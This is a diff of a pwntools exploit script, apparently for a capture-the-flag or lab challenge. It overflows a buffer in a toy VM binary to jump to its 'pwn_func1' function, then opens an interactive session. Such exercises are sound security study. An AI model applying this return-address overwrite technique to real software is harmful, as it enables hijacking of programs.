@@ -1,17 +1,22 @@
+#!/usr/bin/env python3
+import sys
 import pwn
 
-challenge = pwn.process("bin/my_vm1")
+exe = sys.argv[1]
+elf = pwn.ELF(exe)
+pwnfunc1 = elf.symbols['pwn_func1']
 
-pwn_func1 = pwn.p64(0x402521)
-
-payload = b"prints "
-payload += b"A"*540 
-payload += (1).to_bytes(4, byteorder='little')
-payload += b"A"*8
-payload += pwn_func1
-
-with open("exploit.insn","wb") as f:
-  f.write(payload + b"\nexec")
-
-challenge.sendline(payload + b"\nexec")
-challenge.interactive()
+payload = (b'prints '
+            + (b'\xff' * 540)
+            + (b'\0' * 4)
+            + (b'\0' * 8)
+            + pwn.p64(pwnfunc1)
+          )
+with open("/dev/null") as err:
+  io = pwn.process(exe,stderr=err)
+  io.sendline(payload)
+  io.recvuntil(b'Enter command: ')
+  io.send(b'exec\n')
+  out1 = io.recvuntil(b'\n')
+  out2 = io.recvuntil((b'Enter command: ', b'\n'))
+io.interactive()
